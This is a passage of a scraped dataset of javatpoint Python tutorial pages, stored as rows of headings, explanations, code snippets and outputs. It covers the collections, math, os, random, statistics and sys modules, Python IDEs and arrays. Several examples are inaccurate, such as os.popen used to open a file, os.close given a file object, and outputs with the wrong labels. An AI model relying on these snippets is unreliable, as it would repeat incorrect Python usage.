40,['Python Collection Module'],"['The Python collection module is defined as a container that is used to store collections of data, for example - list, dict, set, and tuple, etc. It was introduced to improve the functionalities of the built-in collection containers.']","['https://www.javatpoint.com/python-math-module', 'https://www.javatpoint.com/python-list-comprehension', 'https://www.javatpoint.com/python-math-module', 'https://www.javatpoint.com/python-list-comprehension', 'https://www.javatpoint.com/python-math-module']",[],[],"['namedtuple()', 'OrderedDict()', 'defaultdict()', 'Counter()', 'deque()', 'Chainmap Objects']",[],[],"['Python collection module was first introduced in its 2.4 release.', 'There are different types of collection modules which are as follows:', 'The Python Counter is a subclass of dictionary object which helps to count hashable objects.', 'The Python deque() is a double-ended queue which allows us to add and remove elements from both the ends.', 'It provides the following attribute.', 'data - A real dictionary used to store the contents of the UserDict class.', 'It provides the following attribute.', 'data - A real list is used to store the contents of the User class.', 'It provides the following attribute.', 'data - A real str object is used to store the contents of the UserString class.']","['The Python namedtuple() function returns a tuple-like object with names for each position in the tuple. It was used to eliminate the problem of remembering the index of each field of a tuple object in ordinary tuples.', 'The Python OrderedDict() is similar to a dictionary object where keys maintain the order of insertion. If we try to insert key again, the previous value will be overwritten for that key.', 'The Python defaultdict() is defined as a dictionary-like object. It is a subclass of the built-in dict class. It provides all methods provided by dictionary but takes the first argument as a default data type.', 'A chainmap class is used to groups multiple dictionary together to create a single list. The linked dictionary stores in the list and it is public and can be accessed by the map attribute. Consider the following example.', 'The UserDict behaves as a wrapper around the dictionary objects. The dictionary can be accessed as an attribute by using the UserDict object. It provides the easiness to work with the dictionary.', 'The UserList behaves as a wrapper class around the list-objects. It is useful when we want to add new functionality to the lists. It provides the easiness to work with the dictionary.', 'The UserList behaves as a wrapper class around the list objects. The dictionary can be accessed as an attribute by using the UserString object. It provides the easiness to work with the dictionary.']",[],"[""pranshu = ('James', 24, 'M')"", 'print(pranshu)', 'import collections', 'd1=collections.OrderedDict()', ""d1['A']=10"", ""d1['C']=12"", ""d1['B']=11"", ""d1['D']=13"", 'for k,v in d1.items():', 'print (k,v)', 'from collections import defaultdict', 'number = defaultdict(int)', ""number['one'] = 1"", ""number['two'] = 2"", ""print(number['three'])"", 'from collections import Counter', 'c = Counter()', 'list = [1,2,3,4,5,7,8,5,9,6,10]', 'Counter(list)', 'Counter({1:5,2:4})', 'list = [1,2,4,7,5,1,6,7,6,9,1]', 'c = Counter(list)', 'print(c[1])', 'from collections import deque', 'list = [""x"",""y"",""z""]', 'deq = deque(list)', 'print(deq)', 'from collections import ChainMap', ""baseline = {'Name': 'Peter', 'Age': '14'}"", ""adjustments = {'Age': '14', 'Roll_no': '0012'}"", 'print(list(ChainMap(adjustments, baseline)))']","[""('James', 24, 'M')"", 'A 10', 'C 12', 'B 11', 'D 13', '0', '3', ""deque(['x', 'y', 'z'])"", ""['Name', 'Age', 'Roll_no' ]""]",[],[]
41,['Python Math Module'],"['Python math module is defined as the most famous mathematical functions, which includes trigonometric functions, representation functions, logarithmic functions, etc. Furthermore, it also defines two mathematical constants, i.e., Pie and Euler number, etc.']","['https://www.javatpoint.com/python-os-module', 'https://www.javatpoint.com/python-collection-module', 'https://www.javatpoint.com/python-os-module', 'https://www.javatpoint.com/python-collection-module', 'https://www.javatpoint.com/python-os-module']",[],[],[],"['math.log()', 'math.log10()', 'math.exp()', 'math.pow(x,y)', 'math.floor(x)', 'math.ceil(x)', 'math.fabs(x)', 'math.factorial()', 'math.modf(x)']",[],"[""Euler's number(e): It is defined as the base of the natural logarithmic, and its value is 2.718281828459045."", 'There are different math modules which are given below:', 'This method returns the natural logarithm of a given number. It is calculated to the base e.', 'This method returns base 10 logarithm of the given number and called the standard logarithm.', 'This method returns a floating-point number after raising e to the given number.', 'This method returns the floor value of the x. It returns the less than or equal value to x.', 'This method returns the ceil value of the x. It returns the greater than or equal value to x.', 'This method returns the absolute value of x.', 'This method returns the factorial of the given number x. If x is not integral, it raises a ValueError.', 'This method returns the fractional and integer parts of x. It carries the sign of x is float.']","['Pie (n): It is a well-known mathematical constant and defined as the ratio of circumstance to the diameter of a circle. Its value is 3.141592653589793.', 'This method returns the power of the x corresponding to the value of y. If value of x is negative or y is not integer value than it raises a ValueError.', 'Python provides the several math modules which can perform the complex task in single-line of code. In this tutorial, we have discussed a few important math modules. ']",[],"['import math', 'number = 2e-7  # small value of of x', ""print('log(fabs(x), base) is :', math.log(math.fabs(number), 10))"", 'import math', 'x=13  # small value of of x', ""print('log10(x) is :', math.log10(x))"", 'import math', 'number = 5e-2  # small value of of x', ""print('The given number (x) is :', number)"", ""print('e^x (using exp() function) is :', math.exp(number)-1)"", 'import math', 'number = math.pow(10,2)', 'print(""The power of number:"",number)', 'import math', 'number = math.floor(10.25201)', 'print(""The floor value is:"",number)', 'import math', 'number = math.ceil(10.25201)', 'print(""The floor value is:"",number)', 'import math', 'number = math.fabs(10.001)', 'print(""The floor absolute is:"",number)', 'import math', 'number = math.factorial(7)', 'print(""The factorial of number:"",number)', 'import math', 'number = math.modf(44.5)', 'print(""The modf of number:"",number)']","['log(fabs(x), base) is : -6.698970004336019', 'log10(x) is : 1.1139433523068367', 'The given number (x) is : 0.05', 'e^x (using exp() function) is : 0.05127109637602412', 'The power of number: 100.0', 'The floor value is: 10', 'The floor value is: 11', 'The absolute value is: 10.001', 'The factorial of number: 5040', 'The modf of number: (0.5, 44.0)']",[],[]
42,['Python OS Module'],['Python OS module provides the facility to establish the interaction between the user and the operating system. It offers many useful OS functions that are used to perform OS-based tasks and get related information about operating system.'],"['https://www.javatpoint.com/python-random-module', 'https://www.javatpoint.com/python-math-module', 'https://www.javatpoint.com/python-random-module', 'https://www.javatpoint.com/python-math-module', 'https://www.javatpoint.com/python-random-module']",[],[],"['os.name()', 'os.mkdir()', 'os.getcwd()', 'os.chdir()', 'os.rmdir()', 'os.error()', 'os.popen()', 'os.close()', 'os.rename()', 'os.access()']",[],[],"[""The OS comes under Python's standard utility modules. This module offers a portable way of using operating system dependent functionality."", 'The Python OS module lets us work with the files and directories.', 'There are some functions in the OS module which are given below:', ""Currently, it registers 'posix', 'nt', 'os2', 'ce', 'java' and 'riscos'."", 'The os.mkdir() function is used to create new directory. Consider the following example.', 'It will create the new directory to the path in the string argument of the function in the D drive named folder newdir.', 'It returns the current working directory(CWD) of the file.', 'The os module provides the chdir() function to change the current working directory.', 'The os.error() function defines the OS level errors. It raises OSError in case of invalid or inaccessible file names and path etc.', 'This function opens a file or from the command specified, and it returns a file object which is connected to a pipe.', 'This function closes the associated file with descriptor fr.', 'A file or directory can be renamed by using the function os.rename(). A user can rename the file if it has privilege to change the file.', 'This function uses real uid/gid to test if the invoking user has access to the path.']","['The rmdir() function removes the specified directory with an absolute or related path. First, we have to change the current working directory and remove the folder.']","['This function provides the name of the operating system module that it imports.\nCurrently, it registers \'posix\', \'nt\', \'os2\', \'ce\', \'java\' and \'riscos\'.\nExample\n\r\nimport os \r\nprint(os.name) \r\n\nOutput:\nnt\r\n\nos.mkdir()\nThe os.mkdir() function is used to create new directory. Consider the following example.\n\r\nimport os\r\nos.mkdir(""d:\\\\newdir"")\r\n\nIt will create the new directory to the path in the string argument of the function in the D drive named folder newdir.\nos.getcwd()\nIt returns the current working directory(CWD) of the file.\nExample\n\r\nimport os   \r\nprint(os.getcwd())   \r\n\nOutput:\nC:\\Users\\Python\\Desktop\\ModuleOS\r\n\nos.chdir()\nThe os module provides the chdir() function to change the current working directory.\n\r\nimport os\r\nos.chdir(""d:\\\\"")\r\n\nOutput:\nd:\\\\\r\n\nos.rmdir()\nThe rmdir() function removes the specified directory with an absolute or related path. First, we have to change the current working directory and remove the folder.\nExample\n\r\nimport os\r\n# It will throw a Permission error; that\'s why we have to change the current working directory.\r\nos.rmdir(""d:\\\\newdir"")\r\nos.chdir("".."")\r\nos.rmdir(""newdir"")\r\n\nos.error()\nThe os.error() function defines the OS level errors. It raises OSError in case of invalid or inaccessible file names and path etc.\nExample\n\r\nimport os\r\n\r\ntry:\r\n    # If file does not exist,\r\n    # then it throw an IOError\r\n    filename = \'Python.txt\'\r\n    f = open(filename, \'rU\')\r\n    text = f.read()\r\n    f.close()\r\n\r\n# The Control jumps directly to here if\r\n# any lines throws IOError.\r\nexcept IOError:\r\n\r\n    # print(os.error) will <class \'OSError\'>\r\n    print(\'Problem reading: \' + filename)   \r\n\nOutput:\nProblem reading: Python.txt\r\n\nos.popen()\nThis function opens a file or from the command specified, and it returns a file object which is connected to a pipe.\nExample\n\r\nimport os   \r\nfd = ""python.txt""    \r\n  \r\n# popen() is similar to open()   \r\nfile = open(fd, \'w\')   \r\nfile.write(""This is awesome"")   \r\nfile.close()   \r\nfile = open(fd, \'r\')   \r\ntext = file.read()   \r\nprint(text)   \r\n    \r\n# popen() provides gateway and accesses the file directly   \r\nfile = os.popen(fd, \'w\')   \r\nfile.write(""This is awesome"")   \r\n# File not closed, shown in next function.    \r\n\nOutput:\nThis is awesome\r\n\nos.close()\nThis function closes the associated file with descriptor fr.\nExample\n\r\nimport os   \r\nfr = ""Python1.txt""  \r\nfile = open(fr, \'r\')   \r\ntext = file.read()   \r\nprint(text)   \r\nos.close(file)     \r\n\nOutput:\nTraceback (most recent call last):\r\n  File ""main.py"", line 3, in \r\n    file = open(fr, \'r\')\r\nFileNotFoundError: [Errno 2] No such file or directory: \'Python1.txt\'\r\n\nos.rename()\nA file or directory can be renamed by using the function os.rename(). A user can rename the file if it has privilege to change the file.\nExample\n\r\nimport os   \r\nfd = ""python.txt""  \r\nos.rename(fd,\'Python1.txt\')   \r\nos.rename(fd,\'Python1.txt\')   \r\n\nOutput:\nTraceback (most recent call last):\r\n  File ""main.py"", line 3, in \r\n    os.rename(fd,\'Python1.txt\')\r\nFileNotFoundError: [Errno 2] No such file or directory: \'python.txt\' -> \'Python1.txt\'\r\n\nos.access()\nThis function uses real uid/gid to test if the invoking user has access to the path.\nExample\n\r\nimport os   \r\nimport sys  \r\n  \r\npath1 = os.access(""Python.txt"", os.F_OK)   \r\nprint(""Exist path:"", path1)   \r\n    \r\n# Checking access with os.R_OK   \r\npath2 = os.access(""Python.txt"", os.R_OK)   \r\nprint(""It access to read the file:"", path2)   \r\n    \r\n# Checking access with os.W_OK   \r\npath3 = os.access(""Python.txt"", os.W_OK)   \r\nprint(""It access to write the file:"", path3)   \r\n    \r\n# Checking access with os.X_OK   \r\npath4 = os.access(""Python.txt"", os.X_OK)   \r\nprint(""Check if path can be executed:"", path4)  \r\n\nOutput:\nExist path: False\r\nIt access to read the file: False\r\nIt access to write the file: False\r\nCheck if path can be executed: False\r\n\n\n\nNext TopicPython Random module\n\n\n\n← prev\nnext →\n\n\n', '\nCurrently, it registers \'posix\', \'nt\', \'os2\', \'ce\', \'java\' and \'riscos\'.\nExample\n\r\nimport os \r\nprint(os.name) \r\n\nOutput:\nnt\r\n\nos.mkdir()\nThe os.mkdir() function is used to create new directory. Consider the following example.\n\r\nimport os\r\nos.mkdir(""d:\\\\newdir"")\r\n\nIt will create the new directory to the path in the string argument of the function in the D drive named folder newdir.\nos.getcwd()\nIt returns the current working directory(CWD) of the file.\nExample\n\r\nimport os   \r\nprint(os.getcwd())   \r\n\nOutput:\nC:\\Users\\Python\\Desktop\\ModuleOS\r\n\nos.chdir()\nThe os module provides the chdir() function to change the current working directory.\n\r\nimport os\r\nos.chdir(""d:\\\\"")\r\n\nOutput:\nd:\\\\\r\n\nos.rmdir()\nThe rmdir() function removes the specified directory with an absolute or related path. First, we have to change the current working directory and remove the folder.\nExample\n\r\nimport os\r\n# It will throw a Permission error; that\'s why we have to change the current working directory.\r\nos.rmdir(""d:\\\\newdir"")\r\nos.chdir("".."")\r\nos.rmdir(""newdir"")\r\n\nos.error()\nThe os.error() function defines the OS level errors. It raises OSError in case of invalid or inaccessible file names and path etc.\nExample\n\r\nimport os\r\n\r\ntry:\r\n    # If file does not exist,\r\n    # then it throw an IOError\r\n    filename = \'Python.txt\'\r\n    f = open(filename, \'rU\')\r\n    text = f.read()\r\n    f.close()\r\n\r\n# The Control jumps directly to here if\r\n# any lines throws IOError.\r\nexcept IOError:\r\n\r\n    # print(os.error) will <class \'OSError\'>\r\n    print(\'Problem reading: \' + filename)   \r\n\nOutput:\nProblem reading: Python.txt\r\n\nos.popen()\nThis function opens a file or from the command specified, and it returns a file object which is connected to a pipe.\nExample\n\r\nimport os   \r\nfd = ""python.txt""    \r\n  \r\n# popen() is similar to open()   \r\nfile = open(fd, \'w\')   \r\nfile.write(""This is awesome"")   \r\nfile.close()   \r\nfile = open(fd, \'r\')   \r\ntext = file.read()   \r\nprint(text)   \r\n    \r\n# popen() provides gateway and accesses the file directly   \r\nfile = os.popen(fd, \'w\')   \r\nfile.write(""This is awesome"")   \r\n# File not closed, shown in next function.    \r\n\nOutput:\nThis is awesome\r\n\nos.close()\nThis function closes the associated file with descriptor fr.\nExample\n\r\nimport os   \r\nfr = ""Python1.txt""  \r\nfile = open(fr, \'r\')   \r\ntext = file.read()   \r\nprint(text)   \r\nos.close(file)     \r\n\nOutput:\nTraceback (most recent call last):\r\n  File ""main.py"", line 3, in \r\n    file = open(fr, \'r\')\r\nFileNotFoundError: [Errno 2] No such file or directory: \'Python1.txt\'\r\n\nos.rename()\nA file or directory can be renamed by using the function os.rename(). A user can rename the file if it has privilege to change the file.\nExample\n\r\nimport os   \r\nfd = ""python.txt""  \r\nos.rename(fd,\'Python1.txt\')   \r\nos.rename(fd,\'Python1.txt\')   \r\n\nOutput:\nTraceback (most recent call last):\r\n  File ""main.py"", line 3, in \r\n    os.rename(fd,\'Python1.txt\')\r\nFileNotFoundError: [Errno 2] No such file or directory: \'python.txt\' -> \'Python1.txt\'\r\n\nos.access()\nThis function uses real uid/gid to test if the invoking user has access to the path.\nExample\n\r\nimport os   \r\nimport sys  \r\n  \r\npath1 = os.access(""Python.txt"", os.F_OK)   \r\nprint(""Exist path:"", path1)   \r\n    \r\n# Checking access with os.R_OK   \r\npath2 = os.access(""Python.txt"", os.R_OK)   \r\nprint(""It access to read the file:"", path2)   \r\n    \r\n# Checking access with os.W_OK   \r\npath3 = os.access(""Python.txt"", os.W_OK)   \r\nprint(""It access to write the file:"", path3)   \r\n    \r\n# Checking access with os.X_OK   \r\npath4 = os.access(""Python.txt"", os.X_OK)   \r\nprint(""Check if path can be executed:"", path4)  \r\n\nOutput:\nExist path: False\r\nIt access to read the file: False\r\nIt access to write the file: False\r\nCheck if path can be executed: False\r\n\n\n\nNext TopicPython Random module\n\n\n\n← prev\nnext →\n\n\n']","['To work with the OS module, we need to import the OS module.', 'import os', 'import os', 'print(os.name)', 'import os', 'os.mkdir(""d:\\\\newdir"")', 'import os', 'print(os.getcwd())', 'import os', 'os.chdir(""d:\\\\"")', 'import os', ""# It will throw a Permission error; that's why we have to change the current working directory."", 'os.rmdir(""d:\\\\newdir"")', 'os.chdir("".."")', 'os.rmdir(""newdir"")', 'import os', '# If file does not exist,', '# then it throw an IOError', ""filename = 'Python.txt'"", ""f = open(filename, 'rU')"", 'text = f.read()', 'f.close()', '# The Control jumps directly to here if', '# any lines throws IOError.', 'except IOError:', ""# print(os.error) will <class 'OSError'>"", ""print('Problem reading: ' + filename)"", 'import os', 'fd = ""python.txt""', '# popen() is similar to open()', ""file = open(fd, 'w')"", 'file.write(""This is awesome"")', 'file.close()', ""file = open(fd, 'r')"", 'text = file.read()', 'print(text)', '# popen() provides gateway and accesses the file directly', ""file = os.popen(fd, 'w')"", 'file.write(""This is awesome"")', '# File not closed, shown in next function.', 'import os', 'fr = ""Python1.txt""', ""file = open(fr, 'r')"", 'text = file.read()', 'print(text)', 'os.close(file)', 'import os', 'fd = ""python.txt""', ""os.rename(fd,'Python1.txt')"", ""os.rename(fd,'Python1.txt')"", 'import os', 'import sys', 'path1 = os.access(""Python.txt"", os.F_OK)', 'print(""Exist path:"", path1)', '# Checking access with os.R_OK', 'path2 = os.access(""Python.txt"", os.R_OK)', 'print(""It access to read the file:"", path2)', '# Checking access with os.W_OK', 'path3 = os.access(""Python.txt"", os.W_OK)', 'print(""It access to write the file:"", path3)', '# Checking access with os.X_OK', 'path4 = os.access(""Python.txt"", os.X_OK)', 'print(""Check if path can be executed:"", path4)']","['nt', 'C:\\Users\\Python\\Desktop\\ModuleOS', 'd:\\\\', 'Problem reading: Python.txt', 'This is awesome', 'Traceback (most recent call last):', 'File ""main.py"", line 3, in', ""file = open(fr, 'r')"", ""FileNotFoundError: [Errno 2] No such file or directory: 'Python1.txt'"", 'Traceback (most recent call last):', 'File ""main.py"", line 3, in', ""os.rename(fd,'Python1.txt')"", ""FileNotFoundError: [Errno 2] No such file or directory: 'python.txt' -> 'Python1.txt'"", 'Exist path: False', 'It access to read the file: False', 'It access to write the file: False', 'Check if path can be executed: False']",[],[]
43,['Python Random module'],"['The Python random module functions depend on a pseudo-random number generator function random(), which generates the float number between 0.0 and 1.0.']","['https://www.javatpoint.com/python-statistics-module', 'https://www.javatpoint.com/python-os-module', 'https://www.javatpoint.com/python-statistics-module', 'https://www.javatpoint.com/python-os-module', 'https://www.javatpoint.com/python-statistics-module']",[],[],[],"['random.random()', 'random.randint()', 'random.choice()', 'random.shuffle()', 'random.randrange(beg,end,step)', 'random.seed()']",[],"['There are different types of functions used in a random module which is given below:', 'This function generates a random float number between 0.0 and 1.0.', 'This function returns a random integer between the specified integers.', 'This function returns a randomly selected element from a non-empty sequence.', 'This function randomly reorders the elements in the list.', 'This function is used to apply on the particular random number with the seed argument. It returns the mapper value. Consider the following example.']","['This function is used to generate a number within the range specified in its argument. It accepts three arguments, beginning number, last number, and step, which is used to skip a number in the range. Consider the following example.']",[],"['# importing ""random""  module.', 'import random', '# We are using the choice() function to generate a random number from', '# the given list of numbers.', 'print (""The random number from list is : "",end="""")', 'print (random.choice([50, 41, 84, 40, 31]))', '# We are using randrange() function to generate in range from 100', '# to 500. The last parameter 10 is step size to skip', '# ten numbers when selecting.', 'import random', 'print (""A random number from range is : "",end="""")', 'print (random.randrange(100, 500, 10))', '# importing ""random"" module.', 'import random', '# using random() to generate a random number', '# between 0 and 1', 'print(""The random number between 0 and 1 is : "", end="""")', 'print(random.random())', '# using seed() to seed a random number', 'random.seed(4)']","['The random number from list is : 84', 'A random number from range is : 290', 'The random number between 0 and 1 is : 0.4405576668981033']",[],[]
44,['Python statistics module'],['Python statistics module provides the functions to mathematical statistics of numeric data. There are some popular statistical functions defined in this module.'],"['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']",[],[],"['mean() function', 'median() function', 'mode() function', 'stdev() function', 'median_low()', 'median_high()']",[],[],"['The mean() function is used to calculate the arithmetic mean of the numbers in the list.', 'The median() function is used to return the middle value of the numeric data in the list.', 'The mode() function returns the most common data that occurs in the list.', 'The stdev() function is used to calculate the standard deviation on a given sample which is available in the form of the list.', 'The median_low function is used to return the low median of numeric data in the list.', 'The median_high function is used to return the high median of numeric data in the list.']",[],[],"['import statistics', '# list of positive integer numbers', 'datasets = [5, 2, 7, 4, 2, 6, 8]', 'x = statistics.mean(datasets)', '# Printing the mean', 'print(""Mean is :"", x)', 'import statistics', 'datasets = [4, -5, 6, 6, 9, 4, 5, -2]', '# Printing median of the', '# random data-set', 'print(""Median of data-set is : % s ""', '% (statistics.median(datasets)))', 'import statistics', '# declaring a simple data-set consisting of real valued positive integers.', 'dataset =[2, 4, 7, 7, 2, 2, 3, 6, 6, 8]', '# Printing out the mode of given data-set', 'print(""Calculated Mode % s"" % (statistics.mode(dataset)))', 'import statistics', '# creating a simple data - set', 'sample = [7, 8, 9, 10, 11]', '# Prints standard deviation', 'print(""Standard Deviation of sample is % s ""', '% (statistics.stdev(sample)))', 'import statistics', '# simple list of a set of integers', 'set1 = [4, 6, 2, 5, 7, 7]', '# Note: low median will always be a member of the data-set.', '# Print low median of the data-set', 'print(""Low median of data-set is % s ""', '% (statistics.median_low(set1)))', 'import statistics', '# list of set of the integers', 'dataset = [2, 1, 7, 6, 1, 9]', 'print(""High median of data-set is %s ""', '% (statistics.median_high(dataset)))']","['Mean is : 4.857142857142857', 'Median of data-set is : 4.5', 'Calculated Mode 2', 'Standard Deviation of sample is 1.5811388300841898', 'Low median of the data-set is 5', 'High median of the data-set is 6']",[],[]
45,['Python sys module'],['The python sys module provides functions and variables which are used to manipulate different parts of the Python Runtime Environment. It lets us access system-specific parameters and functions.'],"['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']",[],[],[],[],[],"['import sys', 'First, we have to import the sys module in our program before running any functions.', 'sys.modules', 'This function provides the name of the existing python modules which have been imported.', 'sys.base_exec_prefix', 'This function provides an efficient way to the same value as exec_prefix. If not running a virtual environment, the value will remain the same.', 'sys.base_prefix', 'It is set up during Python startup, before site.py is run, to the same value as prefix. ', 'sys.byteorder', 'It is an indication of the native byteorder that provides an efficient way to do something.', 'sys.maxsize', 'This function returns the largest integer of a variable.', 'This function shows the PYTHONPATH set in the current system. It is an environment variable that is a search path for all the python modules. ', 'It is an object that contains the original values of stdin at the start of the program and used during finalization. It can restore the files.', 'sys.getrefcount', 'This function returns the reference count of an object.', 'This function is used to exit from either the Python console or command prompt, and also used to exit from the program in case of an exception.', 'sys executable', 'The value of this function is the absolute path to a Python interpreter. It is useful for knowing where python is installed on someone else machine.', 'sys.platform', 'This value of this function is used to identify the platform on which we are working.']","['This function returns a list of command line arguments passed to a Python script. The name of the script is always the item at index 0, and the rest of the arguments are stored at subsequent indices.']",[],[],[],[],[]
46,['Python IDEs'],"['IDE stands for Integrated Development Environment is defined as a coding tool that helps to automate the process of editing, compiling, testing, etc. in an SDLC and it provides ease to the developer to run, write and debug the code.']","['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/#PyCharm', 'https://www.javatpoint.com/#Spyder', 'https://www.javatpoint.com/#PyDev', 'https://www.javatpoint.com/#Atom', 'https://www.javatpoint.com/#Wing', 'https://www.javatpoint.com/#JupyterNotebook', 'https://www.javatpoint.com/#Thonny', 'https://www.javatpoint.com/#Rodeo', 'https://www.javatpoint.com/#MicrosoftVisualStudio', 'https://www.javatpoint.com/#Eric', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']","['https://static.javatpoint.com/python/images/python-ides.png', 'https://static.javatpoint.com/python/images/pycharm.png', 'https://static.javatpoint.com/python/images/spyder.png', 'https://static.javatpoint.com/python/images/pydev.png', 'https://static.javatpoint.com/python/images/atom.png', 'https://static.javatpoint.com/python/images/wing.png', 'https://static.javatpoint.com/python/images/jupyter-notebook.png', 'https://static.javatpoint.com/python/images/thonny.png', 'https://static.javatpoint.com/python/images/rodeo.png', 'https://static.javatpoint.com/python/images/microsoftvisualstudio.png', 'https://static.javatpoint.com/python/images/eric.png']",[],"['PyCharm', 'Spyder', 'PyDev', 'Atom', 'Wing', 'Jupyter Notebook', 'Thonny', 'Rodeo', 'Microsoft Visual Studio', 'Eric Python']","['Features', 'Features', 'Features', 'Features', 'Features', 'Features', 'Features', 'Features', 'Features', 'Features']",[],"['It is specially designed for software development that consists of several tools which is used for developing and testing the software.', 'There are some Python IDEs which are as follows:', 'Aleksandar Totic is famous for his contribution to Mosaic browser and worked on Pydev project during 2003-2004.', 'Pydev has a feature which includes Django integration, automatic code completion, smart indents and block indents, etc.', 'It has several features that include auto-completion, syntax highlighting, indents, and debugging.', 'It supports cross-platform functionality and provides auto-completion of code.', 'The Eric Python is an editor which is developed in Python itself and can be used for both professional and non-professional work.']","['It is a complete python IDE that is loaded with a rich set of features like auto code completion, quick project navigation, fast error checking and correction, remote development support, database accessibility, etc.', 'Spyder is an open-source that has high recognition in the IDE market and most suitable for data science. The full name of Spyder is Scientific Python Development Environment. It supports all the significant platforms Linux, Windows, and MacOS X.', 'It provides a set of features like localized code editor, document viewer, variable explorer, integrated console, etc. and supports no. of scientific modules like NumPy, SciPy, etc.', 'PyDev is defined as one of the commonly used Python IDE, which is an external plugin for Eclipse. It is a natural choice of the Python developers that are coming from the Java background and very popular in the market as Python interpreter.', 'It is defined as a cross-platform IDE that is packed with necessary features and with decent development support. Its personal edition is free of cost. The pro version comes with a 30 days trial for the developers to try it out.', 'Thonny is another IDE which is best suited for learning and teaching programming. It is a software developed at the University of Tartu and supports code completion and highlight syntax errors.', 'Rodeo is defined as one of the best IDE for python that is most widely used for data science projects like taking data and information from different resources.', 'Microsoft Visual Studio is an open-source code editor which was best suited for development and debugging of latest web and cloud projects. It has its own marketplace for extensions.']","['PyCharm was developed by the Jet Brains, and it is a cross-platform Integrated Development Environment (IDE) specially designed for python. It is the most widely used IDE and available in both paid version and free open-source as well. It saves ample time by taking care of routine tasks.', 'Atom is developed by GitHub, which is initially started as an open-source, cross-platform. It is based on a framework, i.e., Electron which enables cross-platform desktop application using Chromium and Node.js and generally known as ""Hackable Text Editor for the 21st century"". ', 'Jupyter is one of the most used IPython notebook editors that is used across the Data Science industry. It is a web application that is based on the server-client structure and allows you to create and manipulate notebook documents. It makes the best use of the fact that python is an interpreted language.']",[],[],[],"['|||PyCharm|||Spyder|||PyDev|||Atom|||Wing|||Jupyter Notebook|||Thonny|||Rodeo|||Microsoft Visual Studio|||Eric||||||Smart code navigation|||Errors Highlighting|||Powerful debugger|||Supports Python web development frameworks, i.e., Angular JS, Javascript||||||Proper syntax highlighting and auto code completion |||Integrates strongly with IPython console|||Performs well in multi-language editor and auto code completion mode||||||Strong Parameters like refactoring, debugging, code analysis, and code coverage function.|||It supports virtual environments, Mypy, and black formatter.|||Also supports PyLint integration, remote debugger, Unit test integration, etc.||||||Visualize the results on Atom without open any other window.|||A plugin named ""Markdown Preview Plus"" provides built-in support for editing and visualizing Markdown files.||||||Customizable and can have extensions as well.|||Supports remote development, test-driven development along with the unit test.||||||Supports markdowns|||Easy creation and editing of codes|||Ideal for beginners in data science||||||Simple debugger|||Supports highlighting errors and auto code completion||||||Allows the functions for comparing data, interact, plot, and inspect data.|||Auto code completion, syntax highlighter, visual file navigator, etc.||||||Supports Python Coding in Visual studio|||Available in both paid and free version||||||Offers configurable window layout, editors, source code folding |||Advanced project management capability, version control|||In-built debugger and task management support|||']"
47,['Python Arrays'],"['An array is defined as a collection of items that are stored at contiguous memory locations. It is a container which can hold a fixed number of items, and these items should be of the same type. An array is popular in most programming languages like C/C++, JavaScript, etc. ']","['https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-tutorial']",[],[],"['Array Representation', 'Array operations', 'How to change or add elements', 'Why to use arrays in Python?', 'How to delete elements from an array?', 'Finding the length of an array']",[],[],"['car1 = ""Lamborghini""', 'car2 = ""Bugatti""', 'car3 = ""Koenigsegg""', 'If you want to loop through cars and find a specific one, you can use the array. ', 'Element - Each item stored in an array is called an element.', 'Index - The location of an element in an array has a numerical index, which is used to identify the position of the element.', 'An array can be declared in various ways and different languages. The important points that should be considered are as follows:', 'Some of the basic operations supported by an array are as follows:', 'The Array can be created in Python by importing the array module to the python program. ', 'Accessing array elements', 'We can access the array elements using the respective indices of those elements.', 'Arrays are mutable, and their elements can be changed in a similar way like lists.', 'A combination of arrays saves a lot of time. The array can reduce the overall size of the code.', 'We can easily concatenate any two arrays using the + symbol. ', 'Explanation', 'In the above example, we have defined variables named as ""a, b, c"" that hold the values of an array. ']","['The array can be handled in Python by a module named array. It is useful when we have to manipulate only specific data values. Following are the terms to understand the concept of an array:', 'Explanation: In the above example, we have imported an array, defined a variable named as ""a"" that holds the elements of an array and print the elements by accessing elements through indices of an array.', ""The elements can be deleted from an array using Python's del statement. If we want to delete any value from the array, we can do that by using the indices of a particular element."", 'Explanation: In the above example, we have imported an array and defined a variable named as ""number"" which stores the values of an array. Here, by using del statement, we are removing the third element [3] of the given array. ', 'The length of an array is defined as the number of elements present in an array. It returns an integer value that is equal to the total number of the elements present in that array.', 'Explanation: In the above example, first, we have imported an array and defined a variable named as ""x"" which holds the value of an array and then, we have printed the elements using the indices of an array.']","['Array is an idea of storing multiple items of the same type together and it makes easier to calculate the position of each element by simply adding an offset to the base value. A combination of the arrays could save a lot of time by reducing the overall size of the code. It is used to store multiple values in single variable. If you have a list of items that are stored in their corresponding variables like this:', 'Explanation: In the above example, we have imported an array and defined a variable named as ""numbers"" which holds the value of an array. If we want to change or add the elements in an array, we can do it by defining the particular index of an array where you want to change or add the elements.']","['from array import *', 'arrayName = array(typecode, [initializers])', 'import array as arr', ""a = arr.array('i', [2, 4, 6, 8])"", 'print(""First element:"", a[0])', 'print(""Second element:"", a[1])', 'print(""Second last element:"", a[-1])', 'import array as arr', ""numbers = arr.array('i', [1, 2, 3, 5, 7, 10])"", '# changing first element', 'numbers[0] = 0', ""print(numbers)    # Output: array('i', [0, 2, 3, 5, 7, 10])"", '# changing 3rd to 5th element', ""numbers[2:5] = arr.array('i', [4, 6, 8])"", ""print(numbers)    # Output: array('i', [0, 2, 4, 6, 8, 10])"", 'import array as arr', ""number = arr.array('i', [1, 2, 3, 3, 4])"", 'del number[2]                           # removing third element', ""print(number)                           # Output: array('i', [1, 2, 3, 4])"", 'len(array_name)', ""a=arr.array('d',[1.1 , 2.1 ,3.1,2.6,7.8])"", ""b=arr.array('d',[3.7,8.6])"", ""c=arr.array('d')"", 'print(""Array c = "",c)', 'import array as arr', ""x = arr.array('i', [4, 7, 19, 22])"", 'print(""First element:"", x[0])', 'print(""Second element:"", 